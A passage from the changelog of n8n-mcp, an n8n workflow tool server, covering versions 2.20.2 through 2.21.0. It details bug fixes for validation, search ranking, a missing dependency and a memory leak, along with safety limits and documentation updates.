  - Includes before/after examples and best practices

**New Test Files:**
- `tests/unit/services/workflow-diff-node-rename.test.ts` (925 lines, 14 scenarios)
- `tests/integration/workflow-diff/node-rename-integration.test.ts` (4 real-world workflows)

**Test Coverage:**
1. Simple rename with single connection
2. Multiple incoming connections
3. Multiple outgoing connections
4. IF node branches (true/false)
5. Switch node cases (0, 1, 2, ..., N)
6. Error connections
7. AI tool connections (ai_tool, ai_languageModel)
8. Name collision detection
9. Rename to same name (no-op)
10. Multiple renames in single batch
11. Chain operations (rename + add/remove connections)
12. validateOnly mode
13. continueOnError mode
14. Self-connections (loops)
15. Real-world Issue #353 scenario

#### Benefits

**User Experience:**
- ✅ **Principle of Least Surprise**: Matches n8n UI behavior
- ✅ **Single Operation**: Rename with 1 operation instead of 3+
- ✅ **No Manual Tracking**: System handles all connection updates
- ✅ **Safer**: Collision detection prevents naming conflicts
- ✅ **Faster**: Less error-prone, fewer operations

**Technical:**
- ✅ **100% Backward Compatible**: Enhances existing `updateNode` operation
- ✅ **All Connection Types**: main, error, AI connections, etc.
- ✅ **All Branch Types**: IF, Switch, error outputs
- ✅ **Atomic**: All connections update together or rollback
- ✅ **Works in Both Modes**: atomic and continueOnError

**Comprehensive:**
- ✅ **14 Test Scenarios**: Unit tests covering all edge cases
- ✅ **4 Integration Tests**: Real-world workflow validation
- ✅ **Complete Documentation**: Tool docs with examples
- ✅ **Clear Error Messages**: Name collision detection with actionable guidance

#### Impact on Existing Workflows

**Zero Breaking Changes:**
- All existing workflows continue working
- Existing operations work identically
- Only enhances rename behavior
- No API changes required

**Migration:**
- No migration needed
- Update to v2.21.0 and renames "just work"
- Remove manual connection workarounds at your convenience

#### Related

- **Issue:** #353 - Enhancement: Auto-update connection references on node rename
- **Use Case:** Real-world API endpoint workflow (POST /patients/:id/approaches)
- **Reporter:** Internal testing during workflow refactoring
- **Solution:** Recommended Solution 1 from issue (auto-update)

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

## [2.20.8] - 2025-10-23

### 🐛 Bug Fixes

This release includes two critical bug fixes that improve workflow validation for sticky notes and trigger nodes.

**Fix #1: Sticky Notes Validation - Disconnected Node False Positives (PR #350)**

Fixed bug where sticky notes (UI-only annotation nodes) were incorrectly triggering "disconnected node" validation errors when updating workflows via MCP tools.

#### Problem
- Workflows with sticky notes failed validation with "Node is disconnected" errors
- Validation logic was inconsistent between `workflow-validator.ts` and `n8n-validation.ts`
- Sticky notes are UI-only annotations and should never trigger connection validation

#### Fixed
- **Created Shared Utility Module** (`src/utils/node-classification.ts`):
  - `isStickyNote()`: Identifies all sticky note type variations
  - `isTriggerNode()`: Identifies trigger nodes (webhook, manual, cron, schedule)
  - `isNonExecutableNode()`: Identifies UI-only nodes
  - `requiresIncomingConnection()`: Determines if node needs incoming connections
- **Updated Validators**: Both validation files now properly skip sticky notes

**Fix #2: Issue #351 - Recognize All Trigger Node Types Including Execute Workflow Trigger (PR #352)**

Fixed validation logic that was incorrectly treating Execute Workflow Trigger and other trigger nodes as regular nodes, causing "disconnected node" errors during partial workflow updates.

#### Problem
The workflow validation system used a hardcoded list of only 5 trigger types, missing 200+ trigger nodes including `executeWorkflowTrigger`.

Additionally, no validation prevented users from activating workflows that only have `executeWorkflowTrigger` nodes (which cannot activate workflows - they can only be invoked by other workflows).

#### Fixed
- **Enhanced Trigger Detection** (`src/utils/node-type-utils.ts`):
  - `isTriggerNode()`: Flexible pattern matching recognizes ALL triggers (200+)
  - `isActivatableTrigger()`: Distinguishes triggers that can activate workflows
  - `getTriggerTypeDescription()`: Human-readable trigger descriptions

- **Active Workflow Validation** (`src/services/n8n-validation.ts`):
  - Prevents activation of workflows with only `executeWorkflowTrigger` nodes
  - Clear error messages guide users to add activatable triggers or deactivate the workflow

- **Comprehensive Test Coverage**: 30+ new tests for trigger detection

#### Impact

**Before Fix:**
- ❌ Execute Workflow Trigger and 195+ other triggers flagged as "disconnected nodes"
- ❌ Sticky notes triggered false positive validation errors
- ❌ Could activate workflows with only `executeWorkflowTrigger` (n8n API would reject)

**After Fix:**
- ✅ ALL trigger types recognized (executeWorkflowTrigger, scheduleTrigger, emailTrigger, etc.)
- ✅ Sticky notes properly excluded from validation
- ✅ Clear error messages when trying to activate workflow with only `executeWorkflowTrigger`
- ✅ Future-proof (new trigger nodes automatically supported)
- ✅ Consistent node classification across entire codebase

#### Technical Details

**Files Modified:**
- `src/utils/node-classification.ts` - NEW: Shared node classification utilities
- `src/utils/node-type-utils.ts` - Enhanced trigger detection functions
- `src/services/n8n-validation.ts` - Updated to use shared utilities
- `src/services/workflow-validator.ts` - Updated to use shared utilities
- `tests/unit/utils/node-type-utils.test.ts` - Added 30+ tests
- `package.json` - Version bump to 2.20.8

**Related:**
- **Issue:** #351 - Execute Workflow Trigger not recognized as valid trigger
- **PR:** #350 - Sticky notes validation fix
- **PR:** #352 - Comprehensive trigger detection

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

## [2.20.7] - 2025-10-22

### 🔄 Dependencies

**Updated n8n to v1.116.2**

Updated all n8n dependencies to the latest compatible versions:
- `n8n`: 1.115.2 → 1.116.2
- `n8n-core`: 1.114.0 → 1.115.1
- `n8n-workflow`: 1.112.0 → 1.113.0
- `@n8n/n8n-nodes-langchain`: 1.114.1 → 1.115.1

**Database Rebuild:**
- Rebuilt node database with 542 nodes from updated n8n packages
- All 542 nodes loaded successfully from both n8n-nodes-base (439 nodes) and @n8n/n8n-nodes-langchain (103 nodes)
- Documentation mapping completed for all nodes

**Testing:**
- Changes validated in CI/CD pipeline with full test suite (705 tests)
- Critical nodes validated: httpRequest, code, slack, agent

### 🐛 Bug Fixes

**FTS5 Search Ranking - Exact Match Prioritization**

Fixed critical bug in production search where exact matches weren't appearing first in search results.

#### Problem
- SQL ORDER BY clause was `ORDER BY rank, CASE ... END` (wrong order)
- FTS5 rank sorted first, CASE statement only acted as tiebreaker
- Since FTS5 ranks are always unique, CASE boosting never applied
- Additionally, CASE used case-sensitive comparison failing to match nodes like "Webhook" when searching "webhook"
- Result: Searching "webhook" returned "Webflow Trigger" first, actual "Webhook" node ranked 4th

#### Root Cause Analysis
**SQL Ordering Issue:**
```sql
-- BEFORE (Broken):
ORDER BY rank, CASE ... END  -- rank first, CASE never used
-- Result: webhook ranks 4th (-9.64 rank)
-- Top 3: webflowTrigger (-10.20), vonage (-10.09), renameKeys (-10.01)

-- AFTER (Fixed):
ORDER BY CASE ... END, rank  -- CASE first, exact matches prioritized
-- Result: webhook ranks 1st (CASE priority 0)
```

**Case-Sensitivity Issue:**
- Old: `WHEN n.display_name = ?` (case-sensitive, fails on "Webhook" vs "webhook")
- New: `WHEN LOWER(n.display_name) = LOWER(?)` (case-insensitive, matches correctly)

#### Fixed

**1. Production Code** (`src/mcp/server.ts` lines 1278-1295)
- Changed ORDER BY from: `rank, CASE ... END`
- To: `CASE WHEN LOWER(n.display_name) = LOWER(?) ... END, rank`
- Added case-insensitive comparison with LOWER() function
- Exact matches now consistently appear first in search results

**2. Test Files Updated**
- `tests/integration/database/node-fts5-search.test.ts` (lines 137-160)
- `tests/integration/ci/database-population.test.ts` (lines 206-234)
- Both updated to match corrected SQL logic with case-insensitive comparison
- Tests now accurately validate production search behavior

#### Impact

**Search Quality:**
- ✅ Exact matches now always rank first (webhook, http, code, etc.)
- ✅ Case-insensitive matching works correctly (Webhook = webhook = WEBHOOK)
- ✅ Better user experience - predictable search results
- ✅ SQL query more efficient (correct ordering at database level)

**Performance:**
- Same or better performance (less JavaScript sorting needed)
- Database does the heavy lifting with correct ORDER BY
- JavaScript sorting still provides additional relevance refinement

**Testing:**
- All 705 tests passing (703 passed + 2 fixed)
- Comprehensive testing by n8n-mcp-tester agent
- Code review approved with minor optimization suggestions for future

**Verified Search Results:**
- "webhook" → nodes-base.webhook (1st)
- "http" → nodes-base.httpRequest (1st)
- "code" → nodes-base.code (1st)
- "slack" → nodes-base.slack (1st)
- All case variations work correctly (WEBHOOK, Webhook, webhook)

## [2.20.6] - 2025-10-21

### 🐛 Bug Fixes

**Issue #342: Missing `tslib` Dependency Causing MODULE_NOT_FOUND on Windows**

Fixed critical dependency issue where `tslib` was missing from the published npm package, causing immediate failure when users ran `npx n8n-mcp@latest` on Windows (and potentially other platforms).

#### Problem

Users installing via `npx n8n-mcp@latest` experienced MODULE_NOT_FOUND errors:
```
Error: Cannot find module 'tslib'
Require stack:
- node_modules/@supabase/functions-js/dist/main/FunctionsClient.js
- node_modules/@supabase/supabase-js/dist/main/index.js
- node_modules/n8n-mcp/dist/telemetry/telemetry-manager.js
```

**Root Cause Analysis:**
- `@supabase/supabase-js` depends on `@supabase/functions-js` which requires `tslib` at runtime
- `tslib` was NOT explicitly listed in `package.runtime.json` dependencies
- The publish script (`scripts/publish-npm.sh`) copies `package.runtime.json` → `package.json` before publishing to npm
- CI/CD workflow (`.github/workflows/release.yml` line 329) does the same: `cp package.runtime.json $PUBLISH_DIR/package.json`
- Result: Published npm package had no `tslib` dependency
- When users installed via `npx`, npm didn't install `tslib` → MODULE_NOT_FOUND error

**Why It Worked Locally:**
- Local development uses main `package.json` which has full n8n package dependencies
- `tslib` existed as a transitive dependency through AWS SDK packages
- npm's hoisting made it available locally

**Why It Failed in Production:**
- `npx` installations use the published package (which comes from `package.runtime.json`)
- No transitive path to `tslib` in the minimal runtime dependencies
- npm's dependency resolution on Windows didn't hoist it properly

**Why Docker Worked:**
- Docker builds used `package-lock.json` which included all transitive dependencies
- Or the base image already had `tslib` installed

#### Fixed

**1. Added `tslib` to Runtime Dependencies**
- Added `"tslib": "^2.6.2"` to `package.runtime.json` dependencies (line 14)
- This is the **critical fix** since `package.runtime.json` gets published to npm
- Version `^2.6.2` matches existing transitive dependency versions

**2. Added `tslib` to Development Dependencies**
- Added `"tslib": "^2.6.2"` to `package.json` dependencies (line 154)
- Ensures consistency between development and production
- Prevents confusion for developers

**3. Synced `package.runtime.json` Version**
- Updated `package.runtime.json` version from `2.20.2` to `2.20.5`
- Keeps runtime package version in sync with main package version

#### Technical Details

**Dependency Chain:**
```
n8n-mcp
└── @supabase/supabase-js@2.57.4
    └── @supabase/functions-js@2.4.6
        └── tslib (MISSING) ❌
```

**Publish Process:**
```bash
# CI/CD workflow (.github/workflows/release.yml:329)
cp package.runtime.json $PUBLISH_DIR/package.json
npm publish --access public

# Users install via npx
npx n8n-mcp@latest
# → Gets dependencies from package.runtime.json (now includes tslib ✅)
```

**Files Modified:**
- `package.json` line 154: Added `tslib: "^2.6.2"`
- `package.runtime.json` line 14: Added `tslib: "^2.6.2"` (critical fix)
- `package.runtime.json` line 3: Updated version `2.20.2` → `2.20.5`

#### Impact

**Before Fix:**
- ❌ Package completely broken on Windows for `npx` users
- ❌ Affected all platforms using `npx` (not just Windows)
- ❌ 100% failure rate on fresh installations
- ❌ Workaround: Use v2.19.6 or install with `npm install` + run locally

**After Fix:**
- ✅ `npx n8n-mcp@latest` works on all platforms
- ✅ `tslib` guaranteed to be installed with the package
- ✅ No breaking changes (adding a dependency that was already in transitive tree)
- ✅ Consistent behavior across Windows, macOS, Linux

#### Verification

**Build & Tests:**
- ✅ TypeScript compilation passes
- ✅ Type checking passes (`npm run typecheck`)
- ✅ All tests pass
- ✅ Build succeeds (`npm run build`)

**CI/CD Validation:**
- ✅ Verified CI workflow copies `package.runtime.json` → `package.json` before publish
- ✅ Confirmed `tslib` will be included in published package
- ✅ No changes needed to CI/CD workflows

#### Related

- **Issue:** #342 - Missing `tslib` dependency in v2.20.3 causing MODULE_NOT_FOUND error on Windows
- **Reporter:** @eddyc (thank you for the detailed bug report!)
- **Severity:** CRITICAL - Package unusable via `npx` on Windows
- **Affected Versions:** 2.20.0 - 2.20.5
- **Fixed Version:** 2.20.6

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

## [2.20.5] - 2025-10-21

### 🐛 Bug Fixes

**Validation False Positives Eliminated (80% → 0%)**

This release completely eliminates validation false positives on production workflows through comprehensive improvements to expression detection, webhook validation, and validation profile handling.

#### Problem Statement

Production workflows were experiencing an 80% false positive rate during validation:
- Expression-based URLs flagged as invalid (e.g., `={{ $json.protocol }}://{{ $json.domain }}/api`)
- Expression-based JSON flagged as invalid (e.g., `={{ { key: $json.value } }}`)
- Webhook `onError` validation checking wrong property location (node-level vs parameters)
- "Missing $ prefix" regex flagging valid property access (e.g., `item['json']`)
- `respondToWebhook` nodes incorrectly warned about missing error handling
- Hardcoded credential warnings appearing in all validation profiles

#### Solution Overview

**Phase 1: Centralized Expression Detection**
- Created `src/utils/expression-utils.ts` with 5 core utilities:
  - `isExpression()`: Type predicate detecting `=` prefix
  - `containsExpression()`: Detects `{{ }}` markers (optimized with single regex)
  - `shouldSkipLiteralValidation()`: Main decision utility for validators
  - `extractExpressionContent()`: Extracts expression code
  - `hasMixedContent()`: Detects mixed text+expression patterns
- Added comprehensive test suite with 75 tests (100% statement coverage)

**Phase 2: URL and JSON Validation Fixes**
- Modified `config-validator.ts` to skip expression validation:
  - URL validation: Skip when `shouldSkipLiteralValidation()` returns true (lines 385-397)
  - JSON validation: Skip when value contains expressions (lines 424-439)
- Improved error messages to include actual JSON parse errors

**Phase 3: Webhook Validation Improvements**
- Fixed `onError` property location check in `workflow-validator.ts`:
  - Now checks node-level `onError` property, not `parameters.onError`
  - Added context-aware validation for webhook response modes
- Created specialized `checkWebhookErrorHandling()` helper method (lines 1618-1662):
  - Skips validation for `respondToWebhook` nodes (response nodes)
  - Requires `onError` for `responseNode` mode
  - Provides warnings for regular webhook nodes
- Moved responseNode validation from `node-specific-validators.ts` to `workflow-validator.ts`

**Phase 4: Regex Pattern Enhancement**
- Updated missing prefix pattern in `expression-validator.ts` (line 217):
  - Old: `/(?<!\$|\.)\b(json|node)\b/`
  - New: `/(?<![.$\w['])\b(json|node|input|items|workflow|execution)\b(?!\s*[:''])/`
  - Now correctly excludes:
    - Dollar prefix: `$json` ✓
    - Dot access: `.json` ✓
    - Word chars: `myJson` ✓
    - Bracket notation: `item['json']` ✓
    - After quotes: `"json"` ✓

**Phase 5: Profile-Based Filtering**
- Made hardcoded credential warnings configurable in `enhanced-config-validator.ts`:
  - Created `shouldFilterCredentialWarning()` helper method (lines 469-476)
  - Only show hardcoded credential warnings in `strict` profile
  - Filters warnings in `minimal`, `runtime`, and `ai-friendly` profiles
- Replaced 3 instances of duplicate filtering code (lines 492, 510, 539)

**Phase 6: Code Quality Improvements**
- Fixed type guard order in `hasMixedContent()` (line 90)
- Added type predicate to `isExpression()` for better TypeScript narrowing
- Extracted helper methods to reduce code duplication
- Improved error messages with actual parsing details

**Phase 7: Comprehensive Testing**
- Created `tests/unit/utils/expression-utils.test.ts` with 75 tests:
  - `isExpression()`: 18 tests (valid, invalid, edge cases, type narrowing)
  - `containsExpression()`: 14 tests (markers, edge cases)
  - `shouldSkipLiteralValidation()`: 12 tests (skip conditions, real-world)
  - `extractExpressionContent()`: 11 tests (extraction, edge cases)
  - `hasMixedContent()`: 19 tests (mixed content, type guards)
  - Integration scenarios: 4 tests (real workflow scenarios)
  - Performance test: 10k iterations in <100ms
- Fixed CI test failure by skipping moved validation tests in `node-specific-validators.test.ts`

#### Results

**Validation Accuracy:**
- Total Errors: 16 → 0 (100% elimination)
- Total Warnings: 45 → 27 (40% reduction)
- Valid Workflows: 0/6 → 6/6 (100% success rate)
- False Positive Rate: 80% → 0%

**Test Coverage:**
- New tests: 75 comprehensive test cases
- Statement coverage: 100%
- Line coverage: 100%
- Branch coverage: 95.23%
- All 143 tests passing ✓

**Files Changed:**
- Modified: 7 files
  - `src/services/config-validator.ts`
  - `src/services/enhanced-config-validator.ts`
  - `src/services/expression-validator.ts`
  - `src/services/workflow-validator.ts`
  - `src/services/node-specific-validators.ts`
  - `tests/unit/services/node-specific-validators.test.ts`
- Created: 2 files
  - `src/utils/expression-utils.ts`
  - `tests/unit/utils/expression-utils.test.ts`

**Code Review:**
- ✅ READY TO MERGE
- All phases implemented with critical warnings and suggestions addressed
- Type safety improved with type predicates
- Code duplication eliminated with helper methods
- Comprehensive test coverage with real-world scenarios

**Related:**
- PR #346
- Branch: `feat/sticky-note-validation`

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

## [2.20.4] - 2025-10-21

### 🛡️ Safety & Reliability Enhancements

**HTTP Server Validation Tools - Enhanced Safety Features (builds on PR #343)**

This release adds defensive safety measures to the HTTP server validation tools response handling, preventing potential memory issues and improving code quality.

#### Building on PR #343

PR #343 (merged 2025-10-21) successfully fixed the MCP protocol error -32600 by adding the required `structuredContent` field for validation tools via HTTP transport. This release enhances that fix with additional safety features to match STDIO server behavior.

#### Added

**1. TypeScript Interface for Type Safety**
- Added `MCPToolResponse` interface (src/http-server.ts:26-35)
- Replaced `any` type with proper interface for response objects
- Improves IDE autocomplete, catches type errors at compile time
- Better code maintainability and refactoring safety

**2. 1MB Response Size Validation**
- Implements size check before adding `structuredContent` (src/http-server.ts:434-449)
- Prevents memory exhaustion and potential DoS attacks
- Matches STDIO server behavior (src/mcp/server.ts:515-520)
- **Logic:**
  - Check response size: `responseText.length`
  - If > 1MB: Truncate and skip structuredContent
  - If <= 1MB: Include structuredContent (normal case)

**3. Warning Logs for Large Responses**
- Logs warnings when validation responses exceed 1MB (src/http-server.ts:438-442)
- Includes actual size in logs for debugging
- Helps identify performance issues and potential problems
- **Example:** `Validation tool validate_workflow response is very large (1500000 chars). Truncating for HTTP transport safety.`

**4. Response Truncation for Safety**
- Truncates responses larger than 1MB to 999KB + message (src/http-server.ts:443-444)
- Prevents HTTP transport issues with very large payloads
- Ensures client stability even with pathological inputs
- **Message:** `[Response truncated due to size limits]`

#### Technical Details

**Size Validation Flow:**
```typescript
// 1. Convert result to JSON
let responseText = JSON.stringify(result, null, 2);

// 2. Check size for validation tools
if (toolName.startsWith('validate_')) {
  const resultSize = responseText.length;

  // 3. Apply 1MB limit
  if (resultSize > 1000000) {
    // Large response: truncate and warn
    logger.warn(`Validation tool ${toolName} response is very large...`);
    mcpResult.content[0].text = responseText.substring(0, 999000) +
      '\n\n[Response truncated due to size limits]';
    // Don't include structuredContent
  } else {
    // Normal case: include structured content
    mcpResult.structuredContent = result;
  }
}
```

**STDIO Parity:**
- HTTP server now matches STDIO server safety features
- Same 1MB limit (STDIO: src/mcp/server.ts:516)
- Same truncation behavior
- Same warning logs (STDIO: src/mcp/server.ts:517)
- **Result:** Consistent behavior across both transports

#### Benefits

1. **Prevents DoS Attacks** - Size limits prevent malicious large responses from exhausting memory
2. **Improves HTTP Transport Stability** - Truncation prevents transport layer issues
3. **Better Observability** - Warning logs help identify and debug problems
4. **Type Safety** - Interface prevents type-related bugs during development
5. **Full STDIO Parity** - Consistent safety features across all transports

#### Impact

- **Risk Level:** LOW (only adds safety checks, no logic changes)
- **Breaking Changes:** NONE (backward compatible, only adds truncation for edge cases)
- **Performance Impact:** Negligible (single length check: O(1))
- **Memory Safety:** Significantly improved (prevents unbounded growth)

#### Testing

- ✅ TypeScript compilation passes
- ✅ Type checking passes (`npm run typecheck`)
- ✅ Build succeeds (`npm run build`)
- ✅ No breaking changes to existing functionality
- ✅ All HTTP validation tools continue working normally

#### Documentation

**New Documentation:**
- `docs/CI_TEST_INFRASTRUCTURE.md` - Documents known CI test infrastructure issues
  - Explains why external contributor PRs have integration test failures
  - Clarifies that these are infrastructure issues, not code quality issues
  - Provides workarounds and testing strategies
  - References PR #343 as example

**Why CI Tests Fail for External PRs:**
- GitHub Actions doesn't expose secrets to external contributor PRs (security)
- MSW (Mock Service Worker) doesn't intercept requests properly in CI
- Integration tests expect mock n8n server that isn't responding
- **NOT a code quality issue** - the actual code changes are correct
- Local tests work fine, CI infrastructure needs separate fix

#### Related

- **Builds on:** PR #343 - fix: add structuredContent to HTTP wrapper for validation tools
- **Fixes:** None (enhancement only)
- **References:** MCP protocol specification for tools with outputSchema
- **CI Issue:** External PR integration test failures documented (infrastructure issue)

#### Files Changed

**Code (1 file):**
- `src/http-server.ts` - Enhanced with safety features (interface, size validation, logging)

**Documentation (1 file):**
- `docs/CI_TEST_INFRASTRUCTURE.md` - Documents CI test infrastructure known issues (NEW)

**Configuration (1 file):**
- `package.json` - Version bump to 2.20.4

---

## [2.20.3] - 2025-10-19

### 🔍 Enhanced Error Messages & Documentation

**Issue #331: Enhanced Workflow Validation Error Messages**

Significantly improved error messages and recovery guidance for workflow validation failures, making it easier for AI agents to diagnose and fix workflow issues.

#### Problem

When workflow validation failed after applying diff operations, error messages were generic and unhelpful:
- Simple "Workflow validation failed after applying operations" message
- No categorization of error types
- No recovery guidance for AI agents
- Difficult to understand what went wrong and how to fix it

#### Fixed

**1. Enhanced Error Messages (handlers-workflow-diff.ts:130-193)**
- **Error Categorization**: Analyzes errors and categorizes them by type (operator issues, connection issues, missing metadata, branch mismatches)
- **Targeted Recovery Guidance**: Provides specific, actionable steps based on error type
- **Clear Error Messages**: Shows single error or count with detailed context
- **Auto-Sanitization Notes**: Explains what auto-sanitization can and cannot fix

**Example Error Response**:
```json
{
  "success": false,
  "error": "Workflow validation failed: Disconnected nodes detected: \"Node Name\" (node-type)",
  "details": {
    "errors": ["Disconnected nodes detected..."],
    "errorCount": 1,
    "recoveryGuidance": [
      "Connection validation failed. Check all node connections reference existing nodes.",
      "Use cleanStaleConnections operation to remove connections to non-existent nodes."
    ],
    "note": "Operations were applied but workflow was NOT saved to prevent UI errors.",
    "autoSanitizationNote": "Auto-sanitization runs on all nodes to fix operators/metadata..."
  }
}
```

**2. Comprehensive Documentation Updates**

Updated 4 tool documentation files to explain auto-sanitization system:

- **n8n-update-partial-workflow.ts**: Added comprehensive "Auto-Sanitization System" section
  - Explains what gets auto-fixed (operator structures, missing metadata)
  - Describes sanitization scope (runs on ALL nodes)
  - Lists limitations (cannot fix broken connections, branch mismatches)
  - Provides recovery guidance for issues beyond auto-sanitization

- **n8n-create-workflow.ts**: Added tips and pitfalls about auto-sanitization during workflow creation

- **validate-node-operation.ts**: Added guidance for IF/Switch operator validation
  - Binary vs unary operator rules
  - conditions.options metadata requirements
  - Operator type field usage

- **validate-workflow.ts**: Added best practices about auto-sanitization and validation

#### Impact

**AI Agent Experience**:
- ✅ **Clear Error Messages**: Specific errors with exact problem identification
- ✅ **Actionable Recovery**: Step-by-step guidance to fix issues
- ✅ **Error Categorization**: Understand error type immediately
- ✅ **Example Code**: Error responses include fix suggestions with code snippets

**Documentation Quality**:
- ✅ **Comprehensive**: Auto-sanitization system fully documented
- ✅ **Accurate**: All technical claims verified by tests
- ✅ **Helpful**: Clear explanations of what can/cannot be auto-fixed

**Error Response Structure**:
- `details.errors` - Array of specific error messages
- `details.errorCount` - Number of errors found
- `details.recoveryGuidance` - Actionable steps to fix issues
- `details.note` - Explanation of what happened
- `details.autoSanitizationNote` - Auto-sanitization limitations

#### Testing

- ✅ All 26 update-partial-workflow tests passing
- ✅ All 14 node-sanitizer tests passing
- ✅ Backward compatibility maintained (details.errors field preserved)
- ✅ Integration tested with n8n-mcp-tester agent
- ✅ Code review approved (no critical issues)

#### Files Changed

**Code (1 file)**:
- `src/mcp/handlers-workflow-diff.ts` - Enhanced error messages with categorization and recovery guidance

**Documentation (4 files)**:
- `src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts` - Auto-sanitization section
- `src/mcp/tool-docs/workflow_management/n8n-create-workflow.ts` - Auto-sanitization tips
- `src/mcp/tool-docs/validation/validate-node-operation.ts` - Operator validation guidance
- `src/mcp/tool-docs/validation/validate-workflow.ts` - Auto-sanitization best practices

---

## [2.20.2] - 2025-10-18

### 🐛 Bug Fixes

**Issue #331: Prevent Broken Workflows via Partial Updates (Enhanced)**

Fixed critical issue where `n8n_update_partial_workflow` could create corrupted workflows that n8n API accepts but UI cannot render. **Enhanced validation to detect ALL disconnected nodes**, not just workflows with zero connections.

#### Problem
- Partial workflow updates validated individual operations but not final workflow structure
- Users could inadvertently create invalid workflows:
  - Multi-node workflows with no connections
  - Single non-webhook node workflows
  - **Disconnected nodes when building incrementally** (original fix missed this)
  - Workflows with broken connection graphs
- Result: Workflows existed in API but showed "Workflow not found" in UI

#### Solution (Two-Phase Fix)

**Phase 1 - Basic Validation**:
- ✅ Added final workflow structure validation after applying all diff operations
- ✅ Improved error messages with actionable examples showing correct syntax
- ✅ Reject updates that would create invalid workflows with clear feedback
- ✅ Updated tests to create valid workflows and verify prevention of invalid ones

**Phase 2 - Enhanced Validation** (discovered via real-world testing):
- ✅ Detects ALL disconnected nodes, not just empty connection objects
- ✅ Identifies each disconnected node by name and type
- ✅ Provides specific fix suggestions naming the actual nodes
- ✅ Handles webhook/trigger nodes correctly (can be source-only)
- ✅ Tested against real incremental workflow building scenarios

#### Changes
- `src/mcp/handlers-workflow-diff.ts`: Added `validateWorkflowStructure()` call after diff application
- `src/services/n8n-validation.ts`:
  - Enhanced error messages with operation examples
  - **Added comprehensive disconnected node detection** (Phase 2)
  - Builds connection graph and identifies orphaned nodes
  - Suggests specific connection operations with actual node names
- Tests:
  - Fixed 3 existing tests creating invalid workflows
  - Added 4 new validation tests (3 in Phase 1, 1 in Phase 2)
  - Test for incremental node addition without connections

#### Real-World Testing
Tested against actual workflow building scenario (`chat_workflows_phase1.md`):
- Agent building 28-node workflow incrementally
- Validation correctly detected node added without connection
- Error message provided exact fix with node names
- Prevents UI from showing "Workflow not found" error

#### Impact
- 🎯 **Prevention**: Impossible to create workflows that UI cannot render
- 📝 **Feedback**: Clear error messages explaining why workflow is invalid
- ✅ **Compatibility**: All existing valid workflows continue to work
- 🔒 **Safety**: Validates before API call, prevents corruption at source
- 🏗️ **Incremental Building**: Safe to build workflows step-by-step with validation at each step

## [2.20.2] - 2025-10-18

### 🐛 Critical Bug Fixes

**Issue #330: Memory Leak in sql.js Adapter (Docker/Kubernetes)**

Fixed critical memory leak causing growth from 100Mi to 2.2GB over 2-3 days in long-running Docker/Kubernetes deployments.

#### Problem Analysis

**Environment:**
- Kubernetes/Docker deployments using sql.js fallback
- Growth rate: ~23 MB/hour (444Mi after 19 hours)
- Pattern: Linear accumulation, not garbage collected
- Impact: OOM kills every 24-48 hours in memory-limited pods (256-512MB)

**Root Causes Identified:**

1. **Over-aggressive save triggering:** Every database operation (including read-only queries) triggered saves
2. **Too frequent saves:** 100ms debounce interval = 3-5 saves/second under load
3. **Double allocation:** `Buffer.from()` created unnecessary copy (4-10MB per save)
4. **No cleanup:** Relied solely on garbage collection which couldn't keep pace
5. **Docker limitation:** Main Dockerfile lacked build tools, forcing sql.js fallback instead of better-sqlite3

**Memory Growth Pattern:**
```
Hour 0:   104 MB  (baseline)
Hour 5:   220 MB  (+116 MB)
Hour 10:  330 MB  (+110 MB)
Hour 19:  444 MB  (+114 MB)
Day 3:   2250 MB  (extrapolated - OOM kill)
```

#### Fixed

**Code-Level Optimizations (sql.js adapter):**

✅ **Removed unnecessary save triggers**
- `prepare()` no longer calls `scheduleSave()` (read operations don't modify DB)
- Only `exec()` and `run()` trigger saves (write operations only)
- **Impact:** 90% reduction in save calls

✅ **Increased debounce interval**
- Changed: 100ms → 5000ms (5 seconds)
- Configurable via `SQLJS_SAVE_INTERVAL_MS` environment variable
- **Impact:** 98% reduction in save frequency (100ms → 5s)

✅ **Removed Buffer.from() copy**
- Before: `const buffer = Buffer.from(data);` (2-5MB copy)
- After: `fsSync.writeFileSync(path, data);` (direct Uint8Array write)
- **Impact:** 50% reduction in temporary allocations per save

✅ **Optimized memory allocation**
- Removed Buffer.from() copy, write Uint8Array directly to disk
- Local variable automatically cleared when function exits
- V8 garbage collector can reclaim memory immediately after save
- **Impact:** 50% reduction in temporary allocations per save

✅ **Made save interval configurable**
- New env var: `SQLJS_SAVE_INTERVAL_MS` (default: 5000)
- Validates input (minimum 100ms, falls back to default if invalid)
- **Impact:** Tunable for different deployment scenarios

**Infrastructure Fix (Dockerfile):**

✅ **Enabled better-sqlite3 in Docker**
- Added build tools (python3, make, g++) to main Dockerfile
- Compile better-sqlite3 during npm install, then remove build tools
- Image size increase: ~5-10MB (acceptable for eliminating memory leak)
- **Impact:** Eliminates sql.js entirely in Docker (best fix)

✅ **Railway Dockerfile verified**
- Already had build tools (python3, make, g++)
- Added explanatory comment for maintainability
- **Impact:** No changes needed

#### Impact

**With better-sqlite3 (now default in Docker):**
- ✅ Memory: Stable at ~100-120 MB (native SQLite)
- ✅ Performance: Better than sql.js (no WASM overhead)
- ✅ No periodic saves needed (writes directly to disk)
- ✅ Eliminates memory leak entirely

**With sql.js (fallback only, if better-sqlite3 fails):**
- ✅ Memory: Stable at 150-200 MB (vs 2.2GB after 3 days)
- ✅ No OOM kills in long-running Kubernetes pods
- ✅ Reduced CPU usage (98% fewer disk writes)
- ✅ Same data safety (5-second save window acceptable)

**Before vs After Comparison:**

| Metric | Before Fix | After Fix (sql.js) | After Fix (better-sqlite3) |
|--------|------------|-------------------|---------------------------|
| Adapter | sql.js | sql.js (fallback) | better-sqlite3 (default) |
| Memory (baseline) | 100 MB | 150 MB | 100 MB |
| Memory (after 72h) | 2.2 GB | 150-200 MB | 100-120 MB |
| Save frequency | 3-5/sec | ~1/5sec | Direct to disk |
| Buffer allocations | 4-10 MB/save | 2-5 MB/save | None |
| OOM kills | Every 24-48h | Eliminated | Eliminated |

#### Configuration

**New Environment Variable:**

```bash
SQLJS_SAVE_INTERVAL_MS=5000  # Debounce interval in milliseconds
```

**Usage:**
- Only relevant when sql.js fallback is used
- Default: 5000ms (5 seconds)
- Minimum: 100ms
- Increase for lower memory churn, decrease for more frequent saves
- Invalid values fall back to default

**Example Docker Configuration:**
```yaml
environment:
